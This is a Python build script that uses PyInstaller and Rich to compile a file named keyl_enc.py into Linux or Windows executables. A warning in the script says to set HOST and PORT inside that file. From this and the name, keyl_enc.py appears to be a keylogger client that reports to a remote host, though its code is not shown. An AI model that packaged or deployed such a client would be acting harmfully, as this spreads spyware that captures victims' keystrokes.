"""
build.py
--------
Standalone build script for keyl_enc.py.
- Can build a Linux binary or a Windows .exe (via Wine).
- Uses Rich for pretty live build output.
- Asks user confirmation before proceeding.
"""

import sys
import os
import subprocess
from rich.console import Console
from rich.live import Live
from rich.text import Text
from rich.panel import Panel

console = Console()


def run_build(target: str):
    """
    Run PyInstaller inside Linux or Wine for Windows builds.
    target: "linux" or "windows"
    """
    client_file = "keyl_enc.py"

    if not os.path.exists(client_file):
        console.print(f"[red]Error: {client_file} not found![/red]")
        sys.exit(1)

    if target not in ("linux", "windows"):
        console.print("[red]Invalid target! Use 'linux' or 'windows'.[/red]")
        sys.exit(1)

    console.print(
        Panel(
            f"[cyan]Building client for [bold]{target.upper()}[/bold]...\n"
            f"[yellow]Make sure HOST and PORT are set correctly inside keyl_enc.py![/yellow]",
            title="Build Step",
            style="bold magenta",
        )
    )

    # Ask before proceeding
    choice = (
        console.input(
            "\n[bold yellow]Wanna proceed with build?[/bold yellow] ([green]y[/green]/[red]n[/red]): "
        )
        .strip()
        .lower()
    )

    if choice != "y":
        console.print("[red]Build canceled by user.[/red]")
        sys.exit(0)

    # Command setup
    if target == "linux":
        cmd = [sys.executable, "-m", "PyInstaller", "--onefile", client_file]
    else:  # windows build via Wine
        cmd = ["wine", "python", "-m", "PyInstaller", "--onefile", client_file]

    # Live log display
    log_text = Text()
    panel = Panel(log_text, title="Build Output", style="cyan")

    with Live(panel, refresh_per_second=4, console=console):
        process = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
        )
        for line in process.stdout:
            log_text.append(line)
            log_text.append("\n")
        process.wait()

    if process.returncode == 0:
        console.print(
            Panel(
                f"[green]Build complete![/green]\nExecutable available in ./dist/",
                title="Build Success",
                style="bold green",
            )
        )
    else:
        console.print(
            Panel(
                "[red]Build failed! Check above logs for details.[/red]",
                title="Build Error",
                style="bold red",
            )
        )

    # Optional cleanup
    for artifact in ["keyl_enc.spec", "build"]:
        if os.path.exists(artifact):
            if os.path.isdir(artifact):
                import shutil
                shutil.rmtree(artifact)
            else:
                os.remove(artifact)


def main():
    if len(sys.argv) != 2:
        console.print("[yellow]Usage:[/yellow] python build.py [linux|windows]")
        sys.exit(1)

    target = sys.argv[1].lower()
    run_build(target)


if __name__ == "__main__":
    main()

